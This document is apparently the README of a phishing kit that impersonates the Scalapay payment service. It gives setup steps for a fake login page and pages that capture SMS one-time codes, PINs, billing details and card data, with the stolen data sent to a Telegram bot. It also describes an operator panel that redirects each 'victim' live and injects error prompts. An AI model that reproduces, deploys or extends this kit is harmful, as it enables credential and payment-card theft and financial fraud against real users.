# 🎛️ Scalapay Control Panel v3 (Fixed)

## ✅ Fixes in This Version
- **Images**: All pages now show images correctly (index uses `./images/`, others use `../images/`)
- **Error button**: Just click "⚠️ Error" — no typing needed, sends default error
- **Email mask**: Type freely, no page refresh, click "Set" when ready
- **API path**: Auto-detects if page is in `/pages/` folder

## 🚀 Setup

### 1. Upload ALL files
```
your-site.com/
├── config.php          ← EDIT THIS (Telegram token)
├── api.php             ← Backend
├── panel.php           ← Control Panel
├── index.php           ← Login page (root)
├── .htaccess           ← Security
├── tracker.php         ← (included in pages)
└── pages/
    ├── sms.php
    ├── email.php
    ├── pin.php
    ├── billing.php
    ├── card.php
    └── success.php
```

### 2. Create `data/` folder with 777 permission
```bash
mkdir data
chmod 777 data
```

### 3. Edit `config.php`
```php
$TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
$TELEGRAM_CHAT_ID   = 'YOUR_CHAT_ID';
```

### 4. Access
| URL | Purpose |
|-----|---------|
| `your-site.com/panel.php` | **Control Panel** (pass: `admin123`) |
| `your-site.com/index.php` | **Victim Login** |
| `your-site.com/pages/sms.php` | SMS OTP |

## 🎛️ Panel Features

### Per-Client Row:
```
┌────────┬─────────────┬──────────┬───────┬─────────────┬────────────┬─────────────┬─────────┬────────────────────┐
│ ID     │ IP          │ Status   │ Page  │ Phone       │ Data       │ Redirect    │ Error   │ Email Mask         │
├────────┼─────────────┼──────────┼───────┼─────────────┼────────────┼─────────────┼─────────┼────────────────────┤
│A7B3C9D8│192.168.1.45 │● online  │ login│+39374677... │phone:+3937..│[SMS][Email] │[⚠️Error]│[chi***@gmail.com]  │
│        │             │          │       │             │            │[PIN][Bill]  │         │[Set]               │
│        │             │          │       │             │            │[Card][OK]   │         │                    │
└────────┴─────────────┴──────────┴───────┴─────────────┴────────────┴─────────────┴─────────┴────────────────────┘
```

### Buttons:
- **Redirect**: Each button sends THAT client to that page
- **⚠️ Error**: Click once → error toast appears on client (no typing needed)
- **Email Mask**: Type full mask → click Set
